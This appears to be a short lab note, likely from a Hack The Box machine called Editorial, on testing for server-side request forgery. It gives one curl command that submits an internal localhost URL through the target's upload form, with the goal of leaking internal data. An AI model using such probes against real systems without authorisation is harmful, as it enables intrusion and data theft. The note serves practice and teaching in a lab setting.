@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Test for SSRF vulnerabilities.
+
+CONTEXT:
+Use the upload feature to test URLs.
+
+METHOD / ANSWER:
+Command: `curl -X POST http://editorial.htb/upload --data 'bookurl=http://127.0.0.1:5000'`
+Purpose: Confirm SSRF path to leak internal data.
